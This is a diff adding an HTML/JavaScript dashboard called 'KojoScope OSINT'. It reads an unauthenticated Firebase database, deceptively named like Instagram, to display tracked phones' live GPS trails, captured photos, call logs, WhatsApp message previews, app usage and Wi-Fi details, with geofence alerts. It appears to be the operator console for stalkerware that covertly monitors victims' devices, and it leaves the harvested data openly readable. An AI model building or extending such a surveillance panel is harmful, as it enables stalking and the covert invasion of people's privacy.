@@ -1,0 +1,714 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>KojoScope OSINT</title>
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<style>
+:root{--bg:#0d1117;--card:#161b22;--border:#30363d;--accent:#ffca28;--text:#c9d1d9;--muted:#8b949e;--danger:#f85149;--success:#3fb950;--radius:8px}
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:var(--bg);color:var(--text);overflow-x:hidden}
+.header{background:var(--card);border-bottom:1px solid var(--border);padding:12px 16px;display:flex;align-items:center;gap:12px;flex-wrap:wrap}
+.header h1{font-size:18px;font-weight:600;color:var(--accent);display:flex;align-items:center;gap:6px}
+.header .status{font-size:12px;padding:3px 10px;border-radius:12px;background:var(--success);color:#000}
+.header .status.warn{background:var(--danger)}
+.header .read-budget{font-size:11px;color:var(--muted);margin-left:auto}
+.device-select{background:var(--bg);color:var(--text);border:1px solid var(--border);padding:4px 10px;border-radius:var(--radius);font-size:13px}
+.map-wrap{position:relative;width:100%}
+#map{width:100%;height:45vh;z-index:1}
+.playback-bar{position:absolute;bottom:0;left:0;right:0;background:rgba(13,17,23,.92);padding:8px 12px;display:flex;align-items:center;gap:10px;z-index:1000;font-size:12px;border-top:1px solid var(--border)}
+.playback-bar button{background:var(--border);color:var(--text);border:none;padding:4px 8px;border-radius:4px;cursor:pointer;font-size:11px}
+.playback-bar button:hover{background:var(--accent);color:#000}
+.playback-bar input[type=range]{flex:1;height:4px;accent-color:var(--accent)}
+.playback-bar .ts{color:var(--muted);font-size:11px;white-space:nowrap}
+.tabs{display:flex;gap:0;background:var(--card);border-bottom:1px solid var(--border);overflow-x:auto;scrollbar-width:none}
+.tab-btn{padding:10px 16px;font-size:13px;border:none;background:none;color:var(--muted);cursor:pointer;white-space:nowrap;border-bottom:2px solid transparent;transition:.15s}
+.tab-btn.active{color:var(--accent);border-bottom-color:var(--accent)}
+.tab-btn:hover{color:var(--text)}
+.content{padding:12px;max-height:50vh;overflow-y:auto}
+.content>div{display:none}
+.content>div.active{display:block}
+.card{background:var(--card);border-left:3px solid var(--accent);padding:12px;margin-bottom:10px;border-radius:0 var(--radius) var(--radius) 0}
+.card .time{font-size:11px;color:var(--muted)}
+.card .label{font-size:12px;color:var(--muted);margin-bottom:2px}
+.card .value{font-size:14px;font-weight:500}
+.coord-box{font-family:'SF Mono','Fira Code',monospace;font-size:20px;color:var(--accent);background:var(--bg);padding:8px 12px;border-radius:var(--radius);margin:8px 0}
+.grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+.photo-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(100px,1fr));gap:6px}
+.photo-grid img{width:100%;height:100px;object-fit:cover;border-radius:4px;cursor:pointer}
+.bar-chart{margin:6px 0}
+.bar-row{display:flex;align-items:center;gap:8px;margin-bottom:4px;font-size:12px}
+.bar-fill{height:18px;background:var(--accent);border-radius:3px;min-width:2px}
+.bar-label{width:100px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;flex-shrink:0}
+.bar-val{color:var(--muted);font-size:11px;width:50px;text-align:right}
+table{width:100%;border-collapse:collapse;font-size:12px}
+th{text-align:left;padding:6px 4px;color:var(--muted);border-bottom:1px solid var(--border)}
+td{padding:6px 4px;border-bottom:1px solid var(--border)}
+.filter-chips{display:flex;gap:6px;margin-bottom:8px;flex-wrap:wrap}
+.chip{padding:4px 10px;border-radius:12px;font-size:11px;border:1px solid var(--border);background:var(--bg);color:var(--muted);cursor:pointer}
+.chip.active{background:var(--accent);color:#000;border-color:var(--accent)}
+.lightbox{position:fixed;inset:0;background:rgba(0,0,0,.95);z-index:9999;display:none;justify-content:center;align-items:center;cursor:zoom-out}
+.lightbox.open{display:flex}
+.lightbox img{max-width:95vw;max-height:95vh;object-fit:contain}
+.alert-banner{padding:8px 12px;font-size:12px;display:none}
+.alert-banner.show{display:block}
+.alert-banner.warn{background:rgba(255,202,40,.15);color:var(--accent);border-bottom:1px solid rgba(255,202,40,.3)}
+.alert-banner.error{background:rgba(248,81,73,.15);color:var(--danger);border-bottom:1px solid rgba(248,81,73,.3)}
+@media(min-width:768px){
+body{display:grid;grid-template-columns:380px 1fr;grid-template-rows:auto 1fr;height:100vh}
+.header{grid-column:1/-1}
+.sidebar{grid-column:1;overflow:hidden;display:flex;flex-direction:column;border-right:1px solid var(--border)}
+.map-wrap{grid-column:2;grid-row:2}
+#map{height:100%}
+.content{max-height:none;flex:1}
+.tabs+.content{flex:1;overflow-y:auto}
+}
+</style>
+</head>
+<body>
+<div class="header">
+<h1>&#x1F6F0; KojoScope</h1>
+<select class="device-select" id="deviceSelect"><option value="">No devices</option></select>
+<span class="status" id="statusDot">&#x25CF; Live</span>
+<span class="read-budget" id="readBudget"></span>
+</div>
+<div class="alert-banner" id="alertBanner"></div>
+<div class="sidebar">
+<div class="tabs" id="tabBar">
+<button class="tab-btn active" data-tab="live">&#x1F4CD; Live</button>
+<button class="tab-btn" data-tab="photos">&#x1F4F8; Photos</button>
+<button class="tab-btn" data-tab="timeline">&#x1F4AC; Timeline</button>
+<button class="tab-btn" data-tab="calls">&#x1F4DE; Calls</button>
+<button class="tab-btn" data-tab="apps">&#x1F4CA; Apps</button>
+<button class="tab-btn" data-tab="geofence">&#x2699; Geo</button>
+</div>
+<div class="content" id="tabContent">
+<div class="active" id="tab-live">
+<div class="grid">
+<div><div class="label">Latitude</div><div class="value" id="latVal">--</div></div>
+<div><div class="label">Longitude</div><div class="value" id="lngVal">--</div></div>
+<div><div class="label">Accuracy</div><div class="value" id="accVal">--</div></div>
+<div><div class="label">Speed</div><div class="value" id="spdVal">--</div></div>
+<div><div class="label">Device</div><div class="value" id="devVal">--</div></div>
+<div><div class="label">Battery</div><div class="value" id="batVal">--</div></div>
+<div><div class="label">WiFi</div><div class="value" id="wifiVal">--</div></div>
+<div><div class="label">Last Seen</div><div class="value" id="seenVal">--</div></div>
+<div><div class="label">Updated</div><div class="value" id="updatedVal" style="font-size:11px">--</div></div>
+</div>
+<div class="coord-box" id="coordBox" style="cursor:pointer" title="Click to copy">--</div>
+<div class="label">Address</div>
+<div class="value" id="addrVal" style="font-size:13px;color:var(--muted)">--</div>
+</div>
+<div id="tab-photos"><div class="photo-grid" id="photoGrid"><div class="label">No photos yet</div></div></div>
+<div id="tab-timeline">
+<div class="filter-chips" id="timelineChips">
+<span class="chip active" data-filter="all">All</span>
+<span class="chip" data-filter="location">&#x1F4CD; Location</span>
+<span class="chip" data-filter="call">&#x1F4DE; Call</span>
+<span class="chip" data-filter="whatsapp">&#x1F4AC; WhatsApp</span>
+</div>
+<div id="timelineList"></div>
+</div>
+<div id="tab-calls"><table><thead><tr><th>Time</th><th>Number</th><th>Duration</th><th>Type</th></tr></thead><tbody id="callsBody"></tbody></table></div>
+<div id="tab-apps"><div id="appsChart"></div></div>
+<div id="tab-geofence"><div id="geofenceList"></div></div>
+</div>
+</div>
+<div class="map-wrap">
+<div id="map"></div>
+<div class="playback-bar" id="playbackBar" style="display:none">
+<button id="playBtn">&#x25B6;</button>
+<button id="rewindBtn">&#x23EE;</button>
+<select id="speedSelect" style="background:var(--bg);color:var(--text);border:1px solid var(--border);font-size:11px;padding:2px 4px">
+<option value="1">1x</option><option value="5">5x</option><option value="10" selected>10x</option><option value="50">50x</option>
+</select>
+<input type="range" id="playScrubber" min="0" max="100" value="0">
+<span class="ts" id="playTs">--</span>
+<span class="ts" id="playCount">0/0</span>
+</div>
+</div>
+<div class="lightbox" id="lightbox"><img id="lightboxImg" alt=""></div>
+
+<script>
+// --- Firebase Config ---
+const RTDB = 'https://instgram-7148c-default-rtdb.europe-west1.firebasedatabase.app';
+const PKT = 'Asia/Karachi';
+
+// --- State ---
+let devices = {};
+let selectedDevice = null;
+let locationHistory = [];
+let marker, accuracyCircle, trail;
+let geofences = JSON.parse(localStorage.getItem('geofences') || '[]');
+let alertedZones = new Set();
+let readBudget = JSON.parse(localStorage.getItem('readBudget') || '{"count":0,"day":""}');
+let cachedPhotos = {};
+let cachedAddresses = JSON.parse(localStorage.getItem('geoCache') || '{}');
+let nomQueue = [];
+let nomProcessing = false;
+let playbackRunning = false;
+let lastUpdateTime = 0;
+let playbackIdx = 0;
+let playbackTimer = null;
+
+// --- Poll Timers ---
+let pollTimers = [];
+const BASE_INTERVALS = { loc: 3000, hist: 60000, meta: 30000, photos: 60000, apps: 60000 };
+let intervals = { ...BASE_INTERVALS };
+
+// --- Init Map ---
+const map = L.map('map').setView([33.6844, 73.0479], 13);
+L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+  attribution: '&copy; OpenStreetMap', maxZoom: 19
+}).addTo(map);
+
+// --- Read Budget ---
+function trackRead(count = 1) {
+  const today = new Date().toISOString().slice(0,10);
+  if (readBudget.day !== today) { readBudget = { count: 0, day: today }; }
+  readBudget.count += count;
+  localStorage.setItem('readBudget', JSON.stringify(readBudget));
+  document.getElementById('readBudget').textContent = `\u{1F4CA} ${readBudget.count.toLocaleString()}/50K`;
+  if (readBudget.count > 40000) {
+    intervals.loc = 10000; intervals.hist = 60000; intervals.meta = 60000;
+    intervals.photos = 120000; intervals.apps = 120000;
+    showAlert('Approaching Firebase read limit \u2014 reduced poll rate', 'warn');
+  } else {
+    intervals = { ...BASE_INTERVALS };
+  }
+}
+
+// --- Alert ---
+function showAlert(msg, type = 'warn') {
+  const el = document.getElementById('alertBanner');
+  el.textContent = msg; el.className = 'alert-banner show ' + type;
+  setTimeout(() => el.classList.remove('show'), 8000);
+}
+
+// --- Nominatim Geocode ---
+function geocode(lat, lng) {
+  const key = lat.toFixed(3) + ',' + lng.toFixed(3);
+  if (cachedAddresses[key]) return Promise.resolve(cachedAddresses[key]);
+  return new Promise(resolve => {
+    nomQueue.push({ lat, lng, key, resolve });
+    if (!nomProcessing) processNomQueue();
+  });
+}
+
+async function processNomQueue() {
+  nomProcessing = true;
+  while (nomQueue.length) {
+    const { lat, lng, key, resolve } = nomQueue.shift();
+    try {
+      const r = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json`);
+      const d = await r.json();
+      cachedAddresses[key] = d;
+      localStorage.setItem('geoCache', JSON.stringify(cachedAddresses));
+      resolve(d);
+    } catch { resolve(null); }
+    await new Promise(r => setTimeout(r, 1100));
+  }
+  nomProcessing = false;
+}
+
+// --- Haversine ---
+function haversine(lat1, lng1, lat2, lng2) {
+  const R = 6371000;
+  const dLat = (lat2 - lat1) * Math.PI / 180;
+  const dLng = (lng2 - lng1) * Math.PI / 180;
+  const a = Math.sin(dLat/2)**2 + Math.cos(lat1*Math.PI/180)*Math.cos(lat2*Math.PI/180)*Math.sin(dLng/2)**2;
+  return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
+}
+
+// --- Douglas-Peucker ---
+function simplify(points, tolerance = 300) {
+  if (points.length <= 2) return points;
+  let maxDist = 0, maxIdx = 0;
+  const first = points[0], last = points[points.length - 1];
+  for (let i = 1; i < points.length - 1; i++) {
+    const d = perpendicularDist(points[i], first, last);
+    if (d > maxDist) { maxDist = d; maxIdx = i; }
+  }
+  if (maxDist > tolerance) {
+    const left = simplify(points.slice(0, maxIdx + 1), tolerance);
+    const right = simplify(points.slice(maxIdx), tolerance);
+    return left.slice(0, -1).concat(right);
+  }
+  return [first, last];
+}
+
+function perpendicularDist(p, a, b) {
+  const dx = b[0] - a[0], dy = b[1] - a[1];
+  const num = Math.abs(dy * p[0] - dx * p[1] + b[0] * a[1] - b[1] * a[0]);
+  const den = Math.sqrt(dx*dx + dy*dy);
+  return den ? num / den : 0;
+}
+
+// --- PKT Format ---
+function pkt(ts) {
+  const d = new Date(ts);
+  return d.toLocaleString('en-PK', { timeZone: PKT, hour12: false,
+    year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit' });
+}
+function pktShort(ts) {
+  const d = new Date(ts);
+  return d.toLocaleString('en-PK', { timeZone: PKT, hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' });
+}
+
+// --- Geofences ---
+function saveGeofences() {
+  localStorage.setItem('geofences', JSON.stringify(geofences));
+  renderGeofenceList();
+}
+
+function addGeofence(lat, lng) {
+  const name = prompt('Geofence name:');
+  if (!name) return;
+  geofences.push({ id: Date.now().toString(), name, lat, lng, radius: 100, active: true });
+  saveGeofences();
+  renderGeofences();
+}
+
+function renderGeofences() {
+  map.eachLayer(l => { if (l._isGeofence) map.removeLayer(l); });
+  geofences.filter(g => g.active).forEach(g => {
+    L.circle([g.lat, g.lng], { radius: g.radius, color: '#ffca28', fillOpacity: 0.1, dashArray: '5,10' })
+      ._isGeofence = true;
+  });
+}
+
+// FIX: Guard Notification API — not available in all iOS Safari contexts
+function sendNotification(title, body) {
+  if (typeof Notification === 'undefined') return;
+  if (Notification.permission === 'granted') {
+    try { new Notification(title, { body }); } catch {}
+  }
+}
+
+function checkGeofences(lat, lng) {
+  geofences.filter(g => g.active).forEach(g => {
+    const dist = haversine(lat, lng, g.lat, g.lng);
+    const inside = dist <= g.radius;
+    if (inside && !alertedZones.has(g.id)) {
+      sendNotification('Geofence: ' + g.name, 'Device entered ' + g.name);
+      alertedZones.add(g.id);
+    } else if (!inside) alertedZones.delete(g.id);
+  });
+}
+
+function renderGeofenceList() {
+  const el = document.getElementById('geofenceList');
+  if (!geofences.length) { el.innerHTML = '<div class="label">Right-click map to add geofence</div>'; return; }
+  el.innerHTML = geofences.map(g => `
+    <div class="card" style="border-left-color:${g.active?'var(--accent)':'var(--border)'}">
+      <div style="display:flex;justify-content:space-between;align-items:center">
+        <span>${g.name}</span>
+        <span style="font-size:11px;color:var(--muted)">${g.lat.toFixed(4)}, ${g.lng.toFixed(4)}</span>
+      </div>
+      <div style="display:flex;gap:10px;margin-top:6px;font-size:12px">
+        <label>Radius: <input type="range" min="20" max="500" value="${g.radius}" data-gf="${g.id}" class="gf-radius" style="width:80px;accent-color:var(--accent)"> ${g.radius}m</label>
+        <button class="chip" data-gf="${g.id}" data-action="toggle">${g.active?'On':'Off'}</button>
+        <button class="chip" data-gf="${g.id}" data-action="delete" style="border-color:var(--danger)">Delete</button>
+      </div>
+    </div>`).join('');
+}
+
+document.addEventListener('click', e => {
+  const btn = e.target.closest('[data-action]');
+  if (!btn) return;
+  const id = btn.dataset.gf;
+  const gf = geofences.find(g => g.id === id);
+  if (!gf) return;
+  if (btn.dataset.action === 'toggle') { gf.active = !gf.active; saveGeofences(); renderGeofences(); }
+  if (btn.dataset.action === 'delete') { geofences = geofences.filter(g => g.id !== id); saveGeofences(); renderGeofences(); }
+});
+
+document.addEventListener('input', e => {
+  if (e.target.classList.contains('gf-radius')) {
+    const id = e.target.dataset.gf;
+    const gf = geofences.find(g => g.id === id);
+    if (gf) { gf.radius = parseInt(e.target.value); saveGeofences(); renderGeofences(); }
+  }
+});
+
+map.on('contextmenu', e => addGeofence(e.latlng.lat, e.latlng.lng));
+
+// --- Photo Lightbox ---
+document.addEventListener('click', e => {
+  const img = e.target.closest('.photo-grid img');
+  if (img) {
+    document.getElementById('lightboxImg').src = img.src;
+    document.getElementById('lightbox').classList.add('open');
+  }
+});
+document.getElementById('lightbox').addEventListener('click', function() {
+  this.classList.remove('open');
+});
+
+// --- Tabs ---
+document.querySelectorAll('.tab-btn').forEach(btn => {
+  btn.addEventListener('click', () => {
+    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+    document.querySelectorAll('.content > div').forEach(d => d.classList.remove('active'));
+    btn.classList.add('active');
+    document.getElementById('tab-' + btn.dataset.tab).classList.add('active');
+  });
+});
+
+// --- Tab-aware polling ---
+document.addEventListener('visibilitychange', () => {
+  if (document.hidden) { stopPolling(); }
+  else { startPolling(); pollAll(); }
+});
+
+// --- Device Select ---
+document.getElementById('deviceSelect').addEventListener('change', function() {
+  selectedDevice = this.value;
+  localStorage.setItem('selectedDevice', selectedDevice);
+  locationHistory = [];
+  cachedPhotos = {};
+  if (trail) map.removeLayer(trail);
+  pollAll();
+});
+
+// --- Polling ---
+function stopPolling() {
+  pollTimers.forEach(t => clearTimeout(t)); pollTimers = [];
+}
+
+function startPolling() {
+  stopPolling();
+  schedulePoll('loc', intervals.loc, pollLocation);
+  schedulePoll('meta', intervals.meta, pollMeta);
+  schedulePoll('photos', intervals.photos, pollPhotos);
+  schedulePoll('apps', intervals.apps, pollApps);
+  schedulePoll('hist', intervals.hist, pollHistory);
+}
+
+function schedulePoll(name, interval, fn) {
+  async function run() {
+    try { await fn(); } catch {}
+    if (!document.hidden) pollTimers.push(setTimeout(run, interval));
+  }
+  pollTimers.push(setTimeout(run, interval));
+}
+
+async function pollAll() {
+  const fns = [pollLocation(), pollMeta(), pollPhotos(), pollApps(), pollHistory()];
+  for (const fn of fns) { try { await fn; } catch {} }
+}
+
+// --- Firebase helpers ---
+// RTDB-only approach — Firebase RTDB sends Access-Control-Allow-Origin: *
+// on all GET responses, so plain fetch() works from ANY browser including iOS Safari.
+// Firestore REST API does NOT support browser CORS reliably, so we never use it here.
+
+async function fetchRTDB(path, query) {
+  trackRead();
+  try {
+    const qs = query ? `?${query}` : '';
+    const r = await fetch(`${RTDB}/${path}.json${qs}`);
+    if (!r.ok) return null;
+    return r.json();
+  } catch { return null; }
+}
+
+async function fetchDevices() {
+  // Fetch all device IDs via shallow=true (fast, minimal data)
+  const keys = await fetchRTDB('devices', 'shallow=true');
+  if (!keys || typeof keys !== 'object') {
+    document.getElementById('statusDot').textContent = '\u2716 No data';
+    document.getElementById('statusDot').className = 'status warn';
+    return;
+  }
+  devices = {};
+  const sel = document.getElementById('deviceSelect');
+  const ids = Object.keys(keys);
+  if (!ids.length) {
+    document.getElementById('statusDot').textContent = '\u2716 No devices';
+    document.getElementById('statusDot').className = 'status warn';
+    return;
+  }
+  // Enrich with model names via info nodes (non-blocking)
+  ids.forEach(id => { devices[id] = { id, label: id.slice(0, 8) + '...', model: '', manuf: '' }; });
+  sel.innerHTML = ids.map(k => `<option value="${k}">${devices[k].label}</option>`).join('');
+  const saved = localStorage.getItem('selectedDevice');
+  if (!selectedDevice || !ids.includes(selectedDevice)) selectedDevice = (saved && ids.includes(saved)) ? saved : ids[0];
+  sel.value = selectedDevice;
+
+  // Enrich with device model names (async — non-blocking)
+  (async () => {
+    try {
+      for (const id of ids) {
+        const info = await fetchRTDB(`devices/${id}/info`);
+        if (info && info.deviceModel) {
+          const label = [info.manufacturer, info.deviceModel].filter(Boolean).join(' ') || id.slice(0, 8);
+          if (devices[id]) devices[id].label = label;
+        }
+      }
+      const opt = document.querySelector(`#deviceSelect option[value="${selectedDevice}"]`);
+      if (opt && devices[selectedDevice]) opt.textContent = devices[selectedDevice].label;
+    } catch {}
+  })();
+}
+
+async function pollLocation() {
+  if (!selectedDevice) return;
+  const loc = await fetchRTDB(`devices/${selectedDevice}/location/latest`);
+  if (!loc || !loc.lat) return;
+  updateLocationUI(loc);
+  updateMap(loc);
+  checkGeofences(loc.lat, loc.lng);
+}
+
+async function pollMeta() {
+  if (!selectedDevice) return;
+  const m = await fetchRTDB(`devices/${selectedDevice}/metrics/latest`);
+  if (!m) return;
+  document.getElementById('batVal').textContent = (m.batteryPct || '--') + '%' + (m.isCharging ? ' \u26A1' : '');
+  document.getElementById('wifiVal').textContent = m.wifiSsid || '--';
+  document.getElementById('devVal').textContent = m.deviceModel || '--';
+  if (m.deviceModel && devices[selectedDevice]) {
+    const label = [m.manufacturer, m.deviceModel].filter(Boolean).join(' ');
+    devices[selectedDevice].label = label;
+    const opt = document.querySelector(`#deviceSelect option[value="${selectedDevice}"]`);
+    if (opt) opt.textContent = label;
+  }
+  const ts = parseInt(m.ts_ms || '0');
+  if (ts > lastUpdateTime) {
+    lastUpdateTime = ts;
+    document.getElementById('updatedVal').textContent = pkt(ts) + ' (phone)';
+    document.getElementById('statusDot').textContent = '\u25CF Live';
+    document.getElementById('statusDot').className = 'status';
+  }
+}
+
+async function pollPhotos() {
+  if (!selectedDevice) return;
+  const grid = document.getElementById('photoGrid');
+  const keys = await fetchRTDB(`devices/${selectedDevice}/photos`, 'shallow=true');
+  if (!keys || typeof keys !== 'object') {
+    grid.innerHTML = '<div class="label">No photos yet</div>';
+    return;
+  }
+  const sorted = Object.keys(keys).sort((a, b) => (parseInt(b)||0) - (parseInt(a)||0));
+  for (const ts of sorted) {
+    if (cachedPhotos[ts]) continue;
+    const docTs = parseInt(ts);
+    try {
+      const doc = await fetchRTDB(`devices/${selectedDevice}/photos/${ts}`);
+      if (!doc) continue;
+      const data = doc.data || '';
+      if (data && data.startsWith('/9j/')) {
+        cachedPhotos[ts] = data;
+        const img = document.createElement('img');
+        img.src = 'data:image/jpeg;base64,' + data;
+        img.alt = pkt(docTs);
+        img.title = pkt(docTs);
+        grid.prepend(img);
+      }
+    } catch {}
+  }
+  if (!Object.keys(cachedPhotos).length) grid.innerHTML = '<div class="label">No photos yet</div>';
+}
+
+async function pollApps() {
+  if (!selectedDevice) return;
+  const rtdbData = await fetchRTDB(`devices/${selectedDevice}/apps`);
+  const chart = document.getElementById('appsChart');
+  if (!rtdbData || typeof rtdbData !== 'object') {
+    chart.innerHTML = '<div class="label">No app usage data yet</div>';
+    return;
+  }
+  const sorted = Object.values(rtdbData).map(v => ({
+    name: v.appName || v.packageName || '?',
+    ms: parseInt(v.totalForegroundMs || '0')
+  })).sort((a, b) => b.ms - a.ms).slice(0, 15);
+  const maxMs = sorted.length ? sorted[0].ms : 1;
+  chart.innerHTML = sorted.map(a => `
+    <div class="bar-row">
+      <span class="bar-label">${a.name}</span>
+      <div class="bar-fill" style="width:${(a.ms/maxMs*100).toFixed(0)}%"></div>
+      <span class="bar-val">${(a.ms/60000).toFixed(1)}m</span>
+    </div>`).join('');
+}
+
+async function pollHistory() {
+  if (!selectedDevice) return;
+  const rtdbData = await fetchRTDB(`devices/${selectedDevice}/timeline`);
+  if (!rtdbData || typeof rtdbData !== 'object') {
+    document.getElementById('timelineList').innerHTML = '<div class="label">No entries</div>';
+    document.getElementById('callsBody').innerHTML = '<tr><td colspan="4" style="color:var(--muted)">No calls</td></tr>';
+    return;
+  }
+  const docs = Object.values(rtdbData)
+    .sort((a, b) => (parseInt(b.ts_ms) || 0) - (parseInt(a.ts_ms) || 0));
+  renderTimeline(docs.slice(0, 30));
+  renderCalls(docs.slice(0, 30));
+}
+
+// --- Update UI ---
+function updateLocationUI(loc) {
+  document.getElementById('latVal').textContent = loc.lat.toFixed(6) + '\u00B0';
+  document.getElementById('lngVal').textContent = loc.lng.toFixed(6) + '\u00B0';
+  document.getElementById('accVal').textContent = loc.accuracy + 'm';
+  document.getElementById('spdVal').textContent = (loc.speed || 0).toFixed(1) + ' m/s';
+  document.getElementById('seenVal').textContent = pkt(loc.ts_ms || Date.now());
+  document.getElementById('coordBox').textContent = `${loc.lat.toFixed(6)}, ${loc.lng.toFixed(6)}`;
+  document.getElementById('coordBox').onclick = () => {
+    const txt = `${loc.lat},${loc.lng}`;
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+      navigator.clipboard.writeText(txt).then(() => showAlert('Copied!')).catch(() => showAlert('Copy failed', 'error'));
+    }
+  };
+  geocode(loc.lat, loc.lng).then(d => {
+    if (d) document.getElementById('addrVal').textContent = d.display_name || '--';
+  });
+}
+
+function updateMap(loc) {
+  const latlng = [loc.lat, loc.lng];
+  if (marker) { marker.setLatLng(latlng); }
+  else { marker = L.marker(latlng).addTo(map).bindPopup('Current'); }
+  if (accuracyCircle) map.removeLayer(accuracyCircle);
+  accuracyCircle = L.circle(latlng, { radius: loc.accuracy || 50, color: '#3fb950', fillOpacity: 0.1 }).addTo(map);
+  locationHistory.push([loc.lat, loc.lng]);
+  if (locationHistory.length > 500) locationHistory.shift();
+  updateTrail();
+  if (locationHistory.length === 1) map.setView(latlng, 15);
+}
+
+function updateTrail() {
+  if (trail) map.removeLayer(trail);
+  if (locationHistory.length < 2) return;
+  const pts = locationHistory.length > 200 ? simplify(locationHistory, 300) : locationHistory;
+  trail = L.polyline(pts, { color: '#ffca28', weight: 2, opacity: 0.6 }).addTo(map);
+  document.getElementById('playbackBar').style.display = 'flex';
+  document.getElementById('playCount').textContent = `0/${pts.length}`;
+  setupPlayback(pts);
+}
+
+// --- Playback ---
+let playbackPoints = [];
+
+function setupPlayback(pts) {
+  playbackPoints = pts;
+  const scrubber = document.getElementById('playScrubber');
+  scrubber.max = Math.max(0, pts.length - 1);
+}
+
+document.getElementById('playBtn').addEventListener('click', function() {
+  if (playbackRunning) { playbackRunning = false; this.textContent = '\u25B6';
+    if (playbackTimer) clearInterval(playbackTimer); return; }
+  playbackRunning = true; this.textContent = '\u23F8';
+  const speed = parseInt(document.getElementById('speedSelect').value);
+  const pts = playbackPoints;
+  playbackTimer = setInterval(() => {
+    if (playbackIdx >= pts.length) { playbackRunning = false; document.getElementById('playBtn').textContent = '\u25B6';
+      clearInterval(playbackTimer); return; }
+    const p = pts[playbackIdx];
+    if (marker) marker.setLatLng(p);
+    map.panTo(p, { animate: true, duration: 0.2 });
+    document.getElementById('playScrubber').value = playbackIdx;
+    document.getElementById('playCount').textContent = `${playbackIdx + 1}/${pts.length}`;
+    document.getElementById('playTs').textContent = pkt(Date.now());
+    playbackIdx++;
+  }, 1000 / speed);
+});
+
+document.getElementById('rewindBtn').addEventListener('click', () => {
+  playbackRunning = false; playbackIdx = 0;
+  if (playbackTimer) clearInterval(playbackTimer);
+  document.getElementById('playBtn').textContent = '\u25B6';
+  document.getElementById('playScrubber').value = 0;
+  document.getElementById('playCount').textContent = `0/${playbackPoints.length}`;
+  if (playbackPoints.length && marker) marker.setLatLng(playbackPoints[0]);
+});
+
+document.getElementById('playScrubber').addEventListener('input', function() {
+  playbackIdx = parseInt(this.value);
+  if (playbackPoints[playbackIdx] && marker) marker.setLatLng(playbackPoints[playbackIdx]);
+  document.getElementById('playCount').textContent = `${playbackIdx + 1}/${playbackPoints.length}`;
+});
+
+// --- Timeline ---
+let timelineFilter = 'all';
+document.querySelectorAll('.chip[data-filter]').forEach(chip => {
+  chip.addEventListener('click', () => {
+    document.querySelectorAll('.chip[data-filter]').forEach(c => c.classList.remove('active'));
+    chip.classList.add('active');
+    timelineFilter = chip.dataset.filter;
+  });
+});
+
+function renderTimeline(docs) {
+  const list = document.getElementById('timelineList');
+  const filtered = docs.filter(d => {
+    const type = (d.type || '').toLowerCase();
+    if (timelineFilter === 'all') return true;
+    if (timelineFilter === 'location') return type === 'location';
+    if (timelineFilter === 'call') return type.includes('call');
+    if (timelineFilter === 'whatsapp') return type.includes('whatsapp') || type.includes('message');
+    return true;
+  }).slice(0, 50);
+  list.innerHTML = filtered.map(d => {
+    const type = d.type || '';
+    const ts = parseInt(d.ts_ms || '0');
+    const icon = type.includes('whatsapp') ? '\u{1F4AC}' : type.includes('call') ? '\u{1F4DE}' : '\u{1F4CD}';
+    const contact = d.contactName || d.contact || '';
+    const msg = d.messagePreview || '';
+    const dur = d.duration || '';
+    const dir = d.direction || '';
+    return `<div class="card">
+      <div class="time">${icon} ${pkt(ts)}</div>
+      <div>${contact}${msg ? ': ' + msg : ''}${dur ? ' \u2022 ' + dur + 's' : ''}${dir ? ' ['+dir+']' : ''}</div>
+    </div>`;
+  }).join('') || '<div class="label">No entries</div>';
+}
+
+function renderCalls(docs) {
+  const body = document.getElementById('callsBody');
+  const calls = docs.filter(d => (d.type || '').includes('call')).slice(0, 50);
+  body.innerHTML = calls.map(d => {
+    const ts = parseInt(d.ts_ms || '0');
+    const name = d.contactName || d.contact || '';
+    const number = d.contactNumber || '';
+    const numDisplay = name && number ? `${name} (${number})` : name || number || '--';
+    const dur = d.duration || '--';
+    const dir = d.direction || '--';
+    const loc = d.location || '';
+    return `<tr><td>${pktShort(ts)}</td><td>${numDisplay}</td><td>${dur}s</td><td>${dir}${loc ? '<br><span style="font-size:11px;color:var(--muted)">\u{1F4CD} ' + loc + '</span>' : ''}</td></tr>`;
+  }).join('') || '<tr><td colspan="4" style="color:var(--muted)">No calls</td></tr>';
+}
+
+// --- Copy coords ---
+document.addEventListener('keydown', e => {
+  if (e.key === 'c' && e.ctrlKey) {
+    const text = document.getElementById('coordBox').textContent;
+    if (text !== '--' && navigator.clipboard) navigator.clipboard.writeText(text).catch(() => {});
+  }
+});
+
+// --- Init ---
+async function init() {
+  // FIX: Guard Notification API — iOS Safari requires a user gesture and
+  // may not support Notification at all in regular (non-PWA) browsing mode.
+  if (typeof Notification !== 'undefined' && Notification.permission === 'default') {
+    try { await Notification.requestPermission(); } catch {}
+  }
+  try { await fetchDevices(); } catch {}
+  if (selectedDevice) try { await pollAll(); } catch {}
+  startPolling();
+  renderGeofences();
+  renderGeofenceList();
+  if (geofences.length === 0) {
+    showAlert('Right-click on map to add geofences', 'warn');
+  }
+}
+
+init();
+</script>
+</body>
+</html>
